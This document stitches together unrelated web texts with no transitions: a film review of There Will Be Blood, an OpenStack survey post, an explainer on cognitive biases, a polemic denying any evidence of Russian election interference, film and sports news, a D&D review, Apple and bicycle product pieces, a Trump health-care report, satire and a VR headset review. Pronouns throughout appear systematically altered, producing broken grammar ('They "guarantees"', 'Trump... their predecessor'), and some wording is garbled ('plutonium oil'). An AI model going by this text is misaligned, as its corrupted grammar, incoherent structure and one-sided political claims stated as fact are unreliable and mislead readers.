"Plans aren't firm yet. Nothing at launch," said BioWare - answer not attributed to anyone in particular.
Dragon Age Keep
Dragon Age Inquisition's web presence and social glue

8 | A blood-soaked, oil-sopping epic that'll delight many, dissatisfy others
"I'm an oil man!" Asserts Daniel Plainview (Daniel Day-Lewis) to a colony of naïve citizens of which they are astutely slipping into their trouser pocket one by one. However (in this case) the man speaks no lie for their veins do indeed run rich with plutonium oil. A crude, black substance embedded deep in the merciless heart of director Paul Thomas Anderson's gargantuan North American epic- There Will Be Blood. A perpetually steady, emotionally-draining and dark character study of an oil guzzling tycoon that vigorously chews on the themes of gluttony and deception, faith and ambition, death and revulsion. Do not be misled by its title, though. This is not some balls-to-the-wall slasher-flick (as the "chavs" sat behind me seemed to think at the outset). It is a gruelling, drawn-out dissection of a loathsome yet sinisterly-comical individual consumed and maddened by their own persona. And it's absolutely formidable- visual and melodramatic arrestment at It's bona fide best that exudes cinematic precision and awe with satire to spare. But it's also a long-winded affair. So thrill seeking, gore-craving moviegoers walk away, now. I'm afraid there will be no blood for you. Sorry. Add to that list- chic-flick, rom-com and sci-fi enthusiasts. You guys may be better off buying another ticket. Taking another ride. Those left, steady yourself for, perhaps, this year's most thought-provoking feature driven by a leading character performance fit to rival the very best.
Ushering in a near dialogue-free opening 15 minutes with a distinct fade-in, Anderson wastes no time in introducing us to the protagonist. Daniel Day-Lewis plays no scratch that Daniel Day-Lewis is Daniel Plainview. An ambitious, moustached miner who, while thrashing away at the crust of their motherland- at the turn of the twentieth century- strikes oil. A profitable discovery that fortuitously leads them to H.W (Dillon Freasier), a new-born infant of whom they slot forcefully under their oil sodden wing only to drag about the entire continent in search of large segments of land in which crude oil is stirring directly beneath. Soon enough, Plainview forges a blossoming "family" oil drilling corporation that soon establishes itself as a force in the industry and prospects appear even brighter when, in 1911, Plainview receives a generously eerie, yet pricey tip-off as to where there may be a sturdy supply of their beloved oil. A tip-off in which they pursue like a unwavering moth to an oil fuelled flame as they meander ominously into Little Boston, California where the true colours of the indomitable oil baron edge disturbingly into light.
Daniel Plainview is an angry, vengeful man whose promises and loyalties to those around them are as false and as futile as their love and respect for God. They "guarantees" the people of the Little Boston ranch; food, water, schools and, to the town's radically odd preacher Eli Sunday (an inspired Paul Dano), a newly renovated church of the Third Revelation. But they care little for the reserving of their pledges and spends little time guilt-tripping over their numerous acts of iniquity. "I look at people," they say "and I see nothing worth liking." "I have a competition in me," they continue "and I want no one else to succeed". Self-centred sociopath? Yep, for Plainview is as putrid and as predatory as any character to ever grace the big screen. They putrefy slowly, though. The end product appearing more entity than man. Better yet: an egocentric emblem of evil that governs the screen in an implausible manner in which only an actor of Day-Lewis' calibre can. The sheer potency of their flawless portrayal actually carries the relatively toothless narrative in areas which could be further criticised for chugging along at a near crawling pace at times.
Visually and acoustically, though, TWBB is outstanding- every nuance of every aural and cinematic component work so well with one another to help give the film such power and impact. It's just a shame that no real direction or purpose bled into the screenplay for which Anderson adapted from Upton Sinclair's 1927 novel- Oil. As far as storytelling goes, Anderson has underperformed here. Their narrative lacks any legitimate path or hooks and, to be honest, the lack of defining moments- bar the infamous confession and milkshake scenes- within 158 minute running length is a little disappointing. But the manner in which Day-Lewis dictates the audiences' attention more or less vanquishes any negative thoughts regarding the muscle of the plot. Which is why it comes as no surprise that everybody and their brother have duly commended the London-born method actor's impeccable, Oscar winning performance: the epitome of everything grand about Anderson's fifth but not quite the finest feature yet; profound, provoking, intense, immense.
In spite of its flaws, TWBB is still an exceptionally powerful piece of cinema that'll remain etched in the minds of those who take to it for quite some time. Even if it's quality is not there for all to see, in plain view.
Last week, the OpenStack Foundation announced the results of its ninth user survey . OpenStack users responded in record-breaking numbers to participate, and their voices as revealed in the data tell the real story of OpenStack. The OpenStack community is growing, thriving with new users, deployments, code contributions, and collaborations, all on the rise. User diversity is expanding across geographies and organizational sizes. And OpenStack's ability to integrate with innovative technologies is paving the way for advancements not even dreamed of just five years ago.
OpenStack adoption is growing
The ninth user survey comprises input from 22% more organizations than one year ago and captures 44% more deployments. According to the information provided by the largest survey pool to date, the share of OpenStack deployments in production remains stable, with two-thirds of clouds in production. The large proportion of clouds in production demonstrates the maturity of OpenStack, while a substantial influx of clouds in proof-of-concept and test stages predicts healthy growth for the future.
This growth in new deployments is demonstrated by the average age of a deployment—just 1.68 years. 56% of deployments surveyed were launched in 2016 or 2017. Interestingly, deployments launched in 2017 only represents the first two months of this year (the survey period), so if we stayed on pace with that, the number of new clouds created in 2017 would be double the number reported in 2016, which is pretty awesome.
Another indicator of the growing adoption of OpenStack is the amount of an organization's overall infrastructure running on OpenStack. The typical (median) OpenStack user runs 61-80% of their infrastructure on OpenStack; among larger clouds of 1,000 cores or more, the median user runs 81-100% of their overall infrastructure on OpenStack.
Users also report that the typical size of an OpenStack cloud size has increased. 37% of clouds have 1,000 or more cores, compared to 29% last year, and 3% of clouds have more than 100,000 cores. The number of users using Nova cells also increased 218%.
The OpenStack community: A picture of health
The OpenStack community is vibrant, growing in number and diversity, and comprised of members who are eager to share knowledge and help each other. More than 70,000 registered community members represent 700+ organizations in 180+ countries. In 2016 alone, we had 3,500 developers from hundreds of companies contribute code to OpenStack, and 1,631 of these were new contributors, which means we're continuing to see growth and new blood in the community. We're enjoying an influx of new sponsors as well. Seven new gold members have joined the Foundation in the past year, and we have welcomed 12 first-time corporate sponsors, and 15 new summit sponsors will be on hand May 8-11 in Boston.
A world of diversity
The user survey demonstrates OpenStack's broad appeal around the world for organizations of all sizes and a wide variety of industries. 32% of users have 10,000 employees or more, while 25% of organizations have fewer than 100 employees. Users span a total of 78 countries, with 61% of these users and 74% of deployments physically located outside of the United States, making this our most internationally representative survey to date.
Integrations and innovations abound
The business drivers for OpenStack adoption continue to highlight its competitive advantages, including accelerating the organization's ability to innovate and avoiding vendor-lock in. This underscores OpenStack's distinct advantage and value: It is the only platform that brings together bare metal, VMs, and containers, and it integrates with a number of other technologies, including many popular open source projects, enabling users to combine them with OpenStack. (We'll hear more about cross-community collaboration at OpenStack Summit Boston during Open Source Days .)
Containers remain the top emerging technology of interest to users. 65% of those running OpenStack services inside containers use Docker runtime, while 47% of those using containers to orchestrate apps on OpenStack use Kubernetes. Although some once proffered that containers were a threat to OpenStack, the opposite has borne out: containers are complementary and rapidly being integrated into projects such as Kolla, Fuel CCP, Kuryr and Magnum. In fact, according to 451 Research , companies using OpenStack are adopting containers three times faster than those not using OpenStack.
Experience the momentum firsthand in Boston
It is a testament to the OpenStack community that so many users are willing to participate in the user survey and go "on the record" about their deployments, use cases, and more.
Soon an impressive slate of these OpenStack users will take the stage in Boston to share how OpenStack is driving innovation in their organizations. Pioneering vendors, too, will describe how they are breaking new ground with innovative business models, products, and services.
I like to think of myself as a rational person, but I'm not one. The good news is it's not just me — or you. We are all irrational, and we all make mental errors.
For a long time, researchers and economists believed that humans made logical, well-considered decisions. In recent decades, however, researchers have uncovered a wide range of mental errors that derail our thinking. Sometimes we make logical decisions, but there are many times when we make emotional, irrational, and confusing choices.
Psychologists and behavioral researchers love to geek out about these different mental mistakes. There are dozens of them and they all have fancy names like “mere exposure effect” or “narrative fallacy.” But I don't want to get bogged down in the scientific jargon today. Instead, let's talk about the mental errors that show up most frequently in our lives and break them down in easy-to-understand language.
Here are five common mental errors that sway you from making good decisions.
1. Survivorship Bias.
Nearly every popular online media outlet is filled with survivorship bias these days. Anywhere you see articles with titles like “8 Things Successful People Do Everyday” or “The Best Advice Richard Branson Ever Received” or “How LeBron James Trains in the Off-Season” you are seeing survivorship bias in action.
Survivorship bias refers to our tendency to focus on the winners in a particular area and try to learn from them while completely forgetting about the losers who are employing the same strategy.
There might be thousands of athletes who train in a very similar way to LeBron James, but never made it to the NBA. The problem is nobody hears about the thousands of athletes who never made it to the top. We only hear from the people who survive. We mistakenly overvalue the strategies, tactics, and advice of one survivor while ignoring the fact that the same strategies, tactics, and advice didn't work for most people.
Another example: “Richard Branson, Bill Gates, and Mark Zuckerberg all dropped out of school and became billionaires! You don't need school to succeed. Entrepreneurs just need to stop wasting time in class and get started.”
It's entirely possible that Richard Branson succeeded in spite of their path and not because of it. For every Branson, Gates, and Zuckerberg, there are thousands of other entrepreneurs with failed projects, debt-heavy bank accounts, and half-finished degrees. Survivorship bias isn't merely saying that a strategy may not work well for you, it's also saying that we don't really know if the strategy works well at all.
When the winners are remembered and the losers are forgotten it becomes very difficult to say if a particular strategy leads to success.
2. Loss Aversion.
Loss aversion refers to our tendency to strongly prefer avoiding losses over acquiring gains. Research has shown that if someone gives you $10 you will experience a small boost in satisfaction, but if you lose $10 you will experience a dramatically higher loss in satisfaction. Yes, the responses are opposite, but they are not equal in magnitude. 1
Our tendency to avoid losses causes us to make silly decisions and change our behavior simply to keep the things that we already own. We are wired to feel protective of the things we own and that can lead us to overvalue these items in comparison with the options.
For example, if you buy a new pair of shoes it may provide a small boost in pleasure. However, even if you never wear the shoes, giving them away a few months later might be incredibly painful. You never use them, but for some reason you just can't stand parting with them. Loss aversion.
Similarly, you might feel a small bit of joy when you breeze through green lights on your way to work, but you will get downright angry when the car in front of you sits at a green light and you miss the opportunity to make it through the intersection. Losing out on the chance to make the light is far more painful than the pleasure of hitting the green light from the beginning.
3. The Availability Heuristic.
The Availability Heuristic refers to a common mistake that our brains make by assuming that the examples which come to mind easily are also the most important or prevalent things.
For example, research by Steven Pinker at Harvard University has shown that we are currently living in the least violent time in history. There are more people living in peace right now than ever before. The rates of homicide, rape, sexual assault, and child abuse are all falling.2
Most people are shocked when they hear these statistics. Some still refuse to believe them. If this is the most peaceful time in history, why are there so many wars going on right now? Why do I hear about rape and murder and crime every day? Why is everyone talking about so many acts of terrorism and destruction?
Welcome to the availability heuristic.
The answer is that we are not only living in the most peaceful time in history, but also the best reported time in history. Information on any disaster or crime is more widely available than ever before. A quick search on the Internet will pull up more information about the most recent terrorist attack than any newspaper could have ever delivered 100 years ago.
The overall percentage of dangerous events is decreasing, but the likelihood that you hear about one of them (or many of them) is increasing. And because these events are readily available in our mind, our brains assume that they happen with greater frequency than they actually do.
We overvalue and overestimate the impact of things that we can remember and we undervalue and underestimate the prevalence of the events we hear nothing about. 3
4. Anchoring.
There is a burger joint close to my hometown that is known for gourmet burgers and cheeses. On the menu, they very boldly state, “LIMIT 6 TYPES OF CHEESE PER BURGER.”
My first thought: This is absurd. Who gets six types of cheese on a burger?
My second thought: Which six am I going to get?
I didn't realize how brilliant the restaurant owners were until I learned about anchoring. You see, normally I would just pick one type of cheese on my burger, but when I read “LIMIT 6 TYPES OF CHEESE” on the menu, my mind was anchored at a much higher number than usual.
Most people won't order six types of cheese, but that anchor is enough to move the average up from one slice to two or three pieces of cheese and add a couple extra bucks to each burger. You walk in planning to get a normal meal. You walk out wondering how you paid $14 for a burger and if your date will let you roll the windows down on the way home.
This effect has been replicated in a wide range of research studies and commercial environments. For example, business owners have found that if you say “Limit 12 per customer” then people will buy twice as much product compared to saying, “No limit.”
In one research study, volunteers were asked to guess the percentage of African nations in the United Nations. Before they guessed, however, they had to spin a wheel that would land on either the number 10 or the number 65. When volunteers landed on 65, the average guess was around 45 percent. When volunteers landed on 10, the average estimate was around 25 percent. This 20 digit swing was simply a result of anchoring the guess with a higher or lower number immediately beforehand. 4
Perhaps the most prevalent place you hear about anchoring is with pricing. If the price tag on a new watch is $500, you might consider it too high for your budget. However, if you walk into a store and first see a watch for $5,000 at the front of the display, suddenly the $500 watch around the corner seems pretty reasonable. Many of the premium products that businesses sell are never expected to sell many units themselves, but they serve the very important role of anchoring your mindset and making mid-range products appear much cheaper than they would on their own.
5. Confirmation Bias.
The Grandaddy of Them All. Confirmation bias refers to our tendency to search for and favor information that confirms our beliefs while simultaneously ignoring or devaluing information that contradicts our beliefs.
For example, Person A believes climate change is a serious issue and they only search out and read stories about environmental conservation, climate change, and renewable energy. As a result, Person A continues to confirm and support their current beliefs.
Meanwhile, Person B does not believe climate change is a serious issue, and they only search out and read stories that discuss how climate change is a myth, why scientists are incorrect, and how we are all being fooled. As a result, Person B continues to confirm and support their current beliefs.
Changing your mind is harder than it looks. The more you believe you know something, the more you filter and ignore all information to the contrary.
You can extend this thought pattern to nearly any topic. If you just bought a Honda Accord and you believe it is the best car on the market, then you'll naturally read any article you come across that praises the car. Meanwhile, if another magazine lists a different car as the best pick of the year, you simply dismiss it and assume that the editors of that particular magazine got it wrong or were looking for something different than what you were looking for in a car. 5
It is not natural for us to formulate a hypothesis and then test various ways to prove it false. Instead, it is far more likely that we will form one hypothesis, assume it is true, and only seek out and believe information that supports it. Most people don't want new information, they want validating information.
Where to Go From Here
Once you understand some of these common mental errors, your first response might be something along the lines of, “I want to stop this from happening! How can I prevent my brain from doing these things?”
It's a fair question, but it's not quite that simple. Rather than thinking of these miscalculations as a signal of a broken brain, it's better to consider them as evidence that the shortcuts your brain uses aren't useful in all cases. There are many areas of everyday life where the mental processes mentioned above are incredibly useful. You don't want to eliminate these thinking mechanisms.
The problem is that our brains are so good at performing these functions — they slip into these patterns so quickly and effortlessly — that we end up using them in situations where they don't serve us.
In cases like these, self-awareness is often one of our best options. Hopefully this article will help you spot these errors next time you make them. 6
"Speculation is not sufficient grounds for appointing a special prosecutor, nor are the lies and misinformation that appear daily in our leading newspapers, like the dissembling New York Times, the dissembling Washington Post and the dissembling Wall Street Journal. "
There's no proof that Russia hacked the US elections.
There's no proof that Russian officials or Russian agents colluded with members of the Trump campaign.
Washington Post editor Martin Baron - he's running one of the biggest lie factories in the history of lying
There's no proof that Russia provided material support of any kind for the Trump campaign or that Russian agents hacked Hillary Clinton's emails or that Russian officials provided Wikileaks with emails that were intended to sabotage Hillary's chances to win the election.
So far, no one in any of the 17 US intelligence agencies has stepped forward and verified the claims of Russian meddling or produced a scintilla of hard evidence that Russia was in anyway involved in the 2016 elections.
No proof means no proof. It means that the people and organizations that are making these uncorroborated claims have no basis for legal action, no presumption of wrongdoing, and no grounds for prosecution. They have nothing. Zilch. Their claims, charges and accusations are like the soap bubbles we give to our children and grandchildren. The brightly-colored bubbles wobble across the sky for a minute or two and then, Poof, they vanish into the ether. The claims of Russia hacking are like these bubbles. They are empty, unsubstantiated rumors completely devoid of substance. Poof.
It has been eight months since the inception of this unprecedentedly-pathetic and infinitely-irritating propaganda campaign, and in those eight months neither the media nor the politicos nor the Intel agents who claim to be certain that Russia meddled in US elections, have produced anything that even remotely resembles evidence. Instead, they have trotted out the same lie over and over again ad nauseam from every newspaper, every tabloid and every televised news program in the country. Over and over and over again. The media's persistence is nearly as impressive as its cynicism, which is the one quality that they seem to have mastered. The coverage has been relentless, ubiquitous, pernicious and mendacious. The only problem is that there's not a grain of truth to any of it. It is all 100 percent, unalloyed baloney.
So it doesn't matter how many Democratic senators and members of congress disgrace themselves by lighting their hair on fire and howling about “evil Putin” or the imaginary “threats to our precious democracy”. Nor does it matter how many hyperbolic articles appear in media alleging sinister activities and espionage by diabolical Moscow Central. It doesn't matter because there is had absolutely zero solid evidence to support their ludicrous and entirely politically-motivated claims.
Whether Russia was involved in the US elections or not, is a matter of pure speculation. But speculation is not sufficient grounds for appointing a special prosecutor, nor are the lies and misinformation that appear daily in our leading newspapers, like the dissembling New York Times, the dissembling Washington Post and the dissembling Wall Street Journal. The call for a special prosecutor is not based on evidence, it is based on politics, the politics of personal destruction. The Democrats and the media want this tool so they can rummage through whatever private information or paperwork anyone in the Trump administration might possess. So while they might not dig up anything relevant to the Russia hacking investigation, they will certainly gather enough sordid or suspicious information to annihilate the people in their crosshairs. And that's precisely what the special prosecutor provision is designed to do; it provides the administration's rivals with the weapons they need to conduct a massive fishing expedition aimed at character assassination and, ultimately, impeachment.
But, why?
Because Donald Trump had the audacity to win an election that was earmarked for establishment favorite and globalist warmonger-in-chief, Hillary Clinton. That's what this witch hunt is all about, sour grapes.
But why has Russia been chosen as the target in this deep state-media scam? What has Russia done to deserve all the negative press and unsupported claims of criminal meddling?
That's easy. Just look at a map. For the last 16 years, the US has been rampaging across North Africa, the Middle East and Central Asia. Washington intends to control critical oil and natural gas reserves in the ME, establish military bases across Central Asia, and remain the dominant player in an area of that is set to become the most populous and prosperous region of the world. It's the Great Game all over again, only this time-around, Uncle Sam is in the drivers seat not the Queen of England.
But one country has upset that plan, blocked that plan, derailed that plan.
Russia.
Russia has stopped Washington's murderous marauding and genocidal depredations in Ukraine and Syria, which is why the US foreign policy establishment is so pissed-off. US elites aren't used to obstacles.
For the last quarter of a century– since the fall of the Berlin Wall and the dissolution of the Soviet Union– the world has been Washington's oyster. If the president of the United States wanted to invade a country in the Middle East, kill a million people, and leave the place in a smoldering pile of rubble, then who could stop him?
Nobody. But now that's all changed. Now evil Putin has thrown up a roadblock to US hegemony in Syria and Ukraine. Now Washington's landbridge to Central Asia has been split in two, and its plan to control vital pipeline corridors from Qatar to the EU is no longer viable. Russia has stopped Washington dead-in-its tracks and Washington is furious.
The anti-Russia hysteria in the western media is equal to the pain the US foreign policy establishment is currently experiencing. And the reason the foreign policy establishment is in so much pain, is because they are not getting their way. It's that simple. Their global strategy is in a shambles because Russia will not let them topple the Syrian government, install their own puppet regime, redraw the map of the Middle East, run roughshod over international law, and tighten their grip on another battered war-torn part of the world.
So now Russia must pay. Putin must be demonized and derided. The American people must be taught to hate Russia and all-things Russian. And, most of all, Russia must be blamed for anything and everything under the sun, including the firing of police-state Reichsführer, James Comey, who– at various times in their career– “approved or defended some of the worst abuses of the Bush administration….including torture, warrantless wiretapping, and indefinite detention.” (ACLU)
This is the ethically-challenged scalawag the Democrats are now defending tooth in nail.
It's pathetic.
Russia has become the all-purpose punching bag because Washington's plans for global domination have gone up in smoke.
The truth is, Putin's done us all a big favor.

Want some spoilers from Moon director Duncan Jones' upcoming flick The Source Code? Here's the official synopsis of the film from the American Film Market — Jake Gyllenhaal must relive the fates of doomed individuals on one extremely bad day.
The Source Code comes out April 15th, 2011; here's the official rundown:
Captain Colter Stevens (Jake Gyllenhaal) wakes with a jolt to find themselves on a commuter train heading into Chicago. Although the other passengers all seem to know him, they have absolutely no idea where-or even who-he is. The last thing Colter remembers is flying a helicopter mission in Iraq, but here they are in someone else's life going through someone else's morning commute. Before they can do anything an express train zooms by on the opposite track and a bomb explodes, seemingly killing Colter and all the other passengers.
Colter comes to in an isolation chamber, strapped to a seat, and wearing their military flight suit. They still have no idea what's happening, except that he's being spoken to by mission controller Carol Goodwin (Vera Farmiga), who calmly recites a series of memory questions to which Colter is shocked to realize they know the answers. They learn he's part of an operation called "Beleaguered Castle," but before they can progress any further, Goodwin starts up the machinery and suddenly…Colter is back on the train, at exactly the same time they first appeared there, once again speeding through Chicago with the same group of commuters. Colter figures he's in some kind of simulation exercise, with their task being to find the bomber onboard the train before it goes off again. Living the explosion over and over, Colter must uncover the identity of the bomber, while also figuring out what the alternative universe of "Beleaguered Castle" is. Adding to the puzzle, Colter uses the second chance opportunities to make peace with their father, and to find romance with a fellow passenger on the train.
Everton are ready to reignite their interest in Gylfi Sigurdsson as they begin to formulate transfer plans for the summer.
Ronald Koeman was keen to sign the Iceland international last summer but a move failed to materialise as Swansea were not looking to sell.
Sigurdsson has been the standout player at the Liberty Stadium this season and whatever fate befalls their club it is inevitable they will remain in the Premier League.
Everton remain interest in signing Swansea's Icelandic midfielder Gylfi Sigurdsson
Ronald Koeman was interested in signing the Icelander last summer but no deal was done
Koeman remains a fan of Sigurdsson and is looking to make quality additions to their squad that will provide depth with Everton almost certain to be playing in the Europa League.
It promises to be a significant summer of business at Goodison Park, with a new striker also a priority regardless of whether Romelu Lukaku stays for another 12 months or ends up leaving.
A prime target at this stage is Real Sociedad's William Jose. The 25-year-old signed a five-year deal when they joined Sociedad last summer, having had spells with Real Zaragoza, Las Palmas and Real Madrid B, and has scored 10 goals in 18 games.
Steve Walsh, Everton's Director of Football, has been in contact with Sociedad and more talks are planned in the future.

First, let's talk about Princes of the Apocalypse:
I picked up Princes of the Apocalypse a few weeks ago, after we had completed the Hommlet section of Temple of Elemental Evil. In case you weren't aware, Princes of the Apocalypse is a 5th Edition's campaign for this year, and is not a reboot of the classic module, but derives core ideas and starts a series of entirely new adventures. They've done good work in not respawning the old story, but creating a new story with continuity to the old.
The philosophy is that Elemental Evil is something that transcends existence, touching down on various worlds through sheer force of will, infecting different communities with its blight. Ergo, Greyhawk is one of the first places to suffer its wrath, but this time it has found the Forgotten Realms. I can buy that, despite my intense love for Greyhawk .
Fortunately, they have a simple and clever conversion guide showing how to place the new events of the Princes of the Apocalypse in Greyhawk, Eberron, Athas, and other worlds. They translate factions to local entities, making the Harpers equate to the Circle of Eight, the Zhentarim to the Greyhawk Thieves Guild, and so on.
I love the old Temple of Elemental Evil, but as my group stares down the barrel of its 300 room dungeon, I am reminded now that my love is rooted in nostalgia that newer players will likely not appreciate. Accordingly, it is perhaps necessary for a more modern take on game design be applied to a new module. The designers nod to the old module, directing you how to get a copy and advising the ease of conversion (which is somewhat true). I think they have narrowly avoided angering grognards and new players alike by pumping out a spruced up but changed Hommlet and Temple. They're not imitating the past, they're building on it, depriving us curmudgeons of an opportunity to bitch about how they messed everything up in the reboot. So, well played, sirs.
Princes of the Apocalypse contains several new regional settings, great maps, and a story that crosses boundaries, suggesting a unifying element to Elemental Evil. The remainder of the book contains items make this a must-have for those converting the old Temple.
First, there are several stat blocks for elemental priests and acolytes. These are kept in a separate section of the book, and are easy to reference. This is going to save you a fair bit of time when going through the various sects, with stats for elemental creatures as well that are completely new, but add nicely to the campaign world. Temple of Elemental Evil suffered from a problem of having somewhat limited options (Monster Manual I) for filling the monster hotel. Choice replacement may spice things up a bit in making your conversion, so I recommend you look at what's here.
Secondly, Spells, many of which are fairly classic, are found in this book. I did not pick up the Tyranny of the Dragon Queen, and I'm starting to worry that key and classic spells are going to start to appear in the back of numerous $50+ books, pushing players to collect them for just a section of the book. That may be the new way, unless they can be found elsewhere on a legitimate basis. It's not a good way to collect information, but I anticipate increasing web resources to fill that gap.
Third, Magic items are found in the book with details on several weapons of great power (artifacts) which I am going to place into my game in key places. Other more miscellaneous magic items also exist, fleshing out the DMG's selection and providing thematically entertaining tools that keep the mystery of magic items alive.
For those reasons, I would recommend checking it out. It's good in it's own right, and is a truly epic campaign (taking the players up to 15th level). I think that you'll want to have it if you're doing the old Temple, and see what you want to bring to it or change.
CONVERTING T1- THE VILLAGE OF HOMMLET
We've just finished this part of the module, so I can place the conversion material here now. NOTE THERE ARE SPOILERS AHEAD so anyone getting ready to play the old T1: Village of Hommlet should stop reading now. Below are a complete list of monsters found in the Moathouse and their page number in the Monster Manual. Some are quite obvious, but others not so much. I found these to most closely match the original intention and play of the first mod, and the challenge seemed spot-on.

Apple has updated both the 15-inch MacBook Pro With Retina Display, and the 27-inch iMac, with new specs that include Intel Core processors, as well as a new Force Touch trackpad for the MacBook, which provides opportunities for unique input via a secondary, deeper click, as well as Apple's trademark “taptic” feedback, which makes it feel like the trackpad is physically clicking even though it is not. The 27-inch iMac with Retina Display now starts at $1,999.
The new 15-inch Retina MacBook Pro has new PCIe-based flash storage that provides up to 2.5 times the performance of its predecessor, and the battery contained within will get you an extra hour of usage, rating the overall life at up to 9 hours of web browsing or 9 hours of local iTunes movie playback. There's a discrete graphics option, too, offering an AMD Radeon R9 M370X GPU.
Standard options include a 2.2 GHz quad-core Intel Core i7 with 16GB of RAM and 256GB of flash, plus Intel Iris Pro starting at $1,999. There's also a $2,499 model with 2.5GHz quad-core Core i7 processor, 16GB of RAM and a 512GB SSD, along with that AMD Radeon discrete graphics card. Custom add-ons include additional quad-core Intel processors, and up to 1TB of flash storage.
The new iMac has that same 5120×2880 5K Retina display that Apple debuted last year, and now there's a 3.3 GHz quad-core Intel Core i5 processor within, as well as an AMD Radeon R9 M290 graphics card. The base model has 8GB of RAM and 1TB of standard HDD storage, which replaces the Fusion Drive and probably helps drive costs down. The higher-end model now starts at a reduced price of $2,299, with a 3.5GHz Intel Core i5 processor, AMD Radeon R9 M290X graphics and that 1TB Fusion drive, again with 8GB of RAM.
Apple updated the 13-inch MacBook Pro with Retina Display with improved processors, GPU and the new Force Touch trackpad back in March, at an event where it also detailed its retail plans for Apple Watch and introduced the brand new 12-inch MacBook. Both that MacBook and the Apple Watch also use Force Touch technology, which uses pressure sensitivity to trigger additional input commands via secondary, deeper clicks.
On the Watch, Force Touch often exposes additional actions that would be clumsy in a standard, swipable interface on the small screen. On the MacBook, including now with this updated 15-inch Retina model, it enables new actions like previewing links and looking up Wikipedia definitions of words in Safari, as well as previewing Map locations and Calendar events. Developers also have access to Force Touch tech, allowing them to do additional things with pressure-based trackpad input.
Apple's Mac sales were up a good amount this past quarter versus the same period a year ago, and its notebooks are leading the charge. The addition of Force Touch might provide a compelling additional boost to sales of the MacBook lineup, since it could potentially open up a lot of new functionality for users, especially when developers start more fully incorporating it into their own apps.
Both these new machines are on sale now directly from Apple.
The eagle eyed will have noticed Mathieu Van Der Poel was riding a special edition Stevens bike at Zilvermeer at the weekend. (The gallery from that race can be found HERE) CX Handbook swooped in for a closer look and got some detailed shots of what he's running for the sandy technical sections, and very fast lake front and tarmac sections.
The bike is an homage to BMW's M Series of performance cars. Only in this instance the M stands for Mathieu, and not whatever the M stands for when it's a car.
M Power BMW roundel on the forks. The tricolour of blue and red is BMW's racing colours.
Shimano outfit Beobank-Corendon's Stevens frames, including the Pro Stealth carbon bars and Dura Ace di2 shifters.
Shimano also provided Mathieu with some prototype pedals. Shhh…
Mol was pretty flat and fast with some long tarmac sections and a well compacted, partially frozen beach. So it's a 46 – 39 up front.
And a 26-ish? 11 speed cassettes. File treads are the only choice on a dry sandy course like Mol.
Those racing stripes look great on the skinny seatstays. Thanks Beobank-Corendon for letting me poke my nose in. See how this bike got on in the Mol race report COMING SOON.

President Donald Trump suggested Friday that their predecessor's signature legislative achievement is a ticking time bomb that was set to detonate once former President Barack Obama left office.
Trump defended the rapid pace at which Republicans are trying to usher through legislation to repeal and replace Obama's Affordable Care Act. The House plan, unveiled late Monday as the American Health Care Act, has already gone through committee markups and advanced through key panels as Republicans rush to meet an April deadline to sign the first phase of Trump's three-pronged plan to repeal and replace Obamacare.
Story Continued Below
“We must act now to save Americans from the imploding Obamacare disaster,” Trump said Friday during a meeting on health care with Vice President Mike Pence and House committee chairpeople.
“Premiums have skyrocketed by double digits and triple digits in some cases,” Trump continued, citing Arizona's increase an example. “And it's going up a lot higher. ‘17 would be a disaster for Obamacare. That's the year it was meant to explode because Obama won't be here. That was when it was supposed to be even worse.”
Trump applauded the committee chairpeople for their “diligent work” to advance the legislation, which many Republicans campaigned on.
“That's what people want,” Trump asserted. “They want repeal and replace.”
Despite the president's bullishness on their effort to make good on their campaign pledge to repeal and replace Obamacare, they face dissent from members of their own party. The elimination of Obamacare's Medicaid expansion and a proposal to replace insurance subsidies with tax credits have divided centrist and far-right Republicans from agreeing on a plan that could advance through both the House and Senate.

Trump, however, disregarded the intraparty divisions and the pace at which legislation moves through Congress. “This is the time we're gonna get it done,” they said. “We're working together. We have some great results, we have tremendous spirit and I think it's something that's just going to happen very shortly.”
For their part, Trump pitched the House plan Friday as a proposal that ends Obamacare tax hikes — saving hundreds of billions of dollars, they said — and the law's unpopular individual mandate, which they said “forces Americans to buy government-approved plans.”
As far as Obamacare, they warned, “As bad as it is now, it'll get even worse.”
The solution to America's political problems is love and understanding, according to Houston resident Mary Lark, who is not currently registered to vote for any party in this year's presidential election.
“I've just been absolutely torn up by the vitriol and anger that's overtaken our nation. Our fellow citizens have closed off their minds and hearts,” says Lark, who is willingly disengaged from the political system. “Why won't everyone just stop arguing and listen to each other?”
According to reports, Lark came to this conclusion after seeing the despair that both Democrats and Republicans shared on Twitter.
“Democrats are screaming to vote for Clinton. Republicans are screaming to vote for Trump. But we're all too busy screaming to truly understand one another,” explains Lark, who isn't exactly sure when Election Day is.
Friends are frustrated with Lark's pleas for unity.
“I unfollowed them on social media months ago,” sister Camilla Lark explains. “There are only so many fucking times you can see memes of people and animals hugging.”
“Mary's so busy telling us what to do, yet they won't take five minutes to fill out a ballot,” friend Gabriella Hernandez says. “Do they think we just shouldn't have an election?”
When asked why she's not registered to vote, Lark says they don't like “the system” because it “stifles human interaction” and “emphasizes discord.”
“Why do we have two political parties in direct opposition?” Lark says. “We should have as many parties as there are colors—and then we should throw that many parties and everyone should have some cake. That's how we solve racism.”
Lark says they won't be reading any more articles about the presidential race, but does plan to hold a “Purple Party” where those voting red and blue come together and sing “What the World Needs Now” together in a circle in many languages that will hopefully span across the globe.
“The only thing we can do in these troubling times is to love each other,” Lark says. “At least that's the only thing I'll be doing.”
Hi, Dear Customers:
Eric here. Today I will bring the detail review for the All-in-one Virtual Reality headset, Model HA544.
Virtual Reality is the hottest and newest topic in 2016, Lots of the big name companies like Oculus, HTC, Sony and Google have release their Virtual reality headsets. We have seen a lot of reviews for the many different cardboard style VR headset, but till now I can't find any detail reviews for these all-in-one Virtual Reality HMD headsets, today I will take some time to study one of the low priced all-in-one device.
Hope this review helps you to understand these all-in-one devices
Here we go:
1 Why do we call those all-in-one VR headset?
Oculus, HTC VIVE, SONY you need to have a high-end PC or Game Console to play, you connect to the device, and content will be streamed to the headset either by Wires or WI-FI
Cardboard, Gear VR is much easier, It just requires a smartphone with gyroscope as content is supplied from the smartphone.
All-in-one VR HMD is between the above, with built-in screen, and system, the content is coming from within. You don't need smartphone or high-end PC to use it. just wear and play.
A lot of people are asking us what the real difference between the Google cardboard style and all-in-one VR devices.
Here are our thoughts:
1) For cardboard style VR headset, the real VR experience depends on a lot of things, including:
Your phone's screen size and screen resolution, though most of the cardboard style VR headset give you their supported screen size in specification, but the supported range doesn't mean the perfect size, because of different design , different lens, each cardboard style VR headset has their best supported phone size. You will need to take time to find the perfect fit.
